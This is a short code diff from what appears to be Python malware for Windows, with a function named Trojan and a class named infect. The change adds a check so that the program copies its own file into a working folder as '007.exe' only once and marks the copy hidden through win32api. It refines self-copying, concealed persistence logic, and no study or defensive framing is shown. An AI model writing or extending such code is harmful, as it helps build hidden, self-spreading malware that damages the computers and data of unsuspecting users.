@@ -30,11 +30,12 @@ def Trojan():
 
 
 if os.getcwd()!=work_home:
-    with open(filename,'rb') as load:
-        page=load.read()
-        with open(work_home+"\\007.exe",'wb') as loads:
-            loads.write(page)
-    win32api.SetFileAttributes(work_home+"\\007.exe",win32con.FILE_ATTRIBUTE_HIDDEN)
+    if '007.exe' not in os.listdir(work_home):
+        with open(filename,'rb') as load:
+            page=load.read()
+            with open(work_home+"\\007.exe",'wb') as loads:
+                loads.write(page)
+        win32api.SetFileAttributes(work_home+"\\007.exe",win32con.FILE_ATTRIBUTE_HIDDEN)
 
 class infect:
     def go(self):
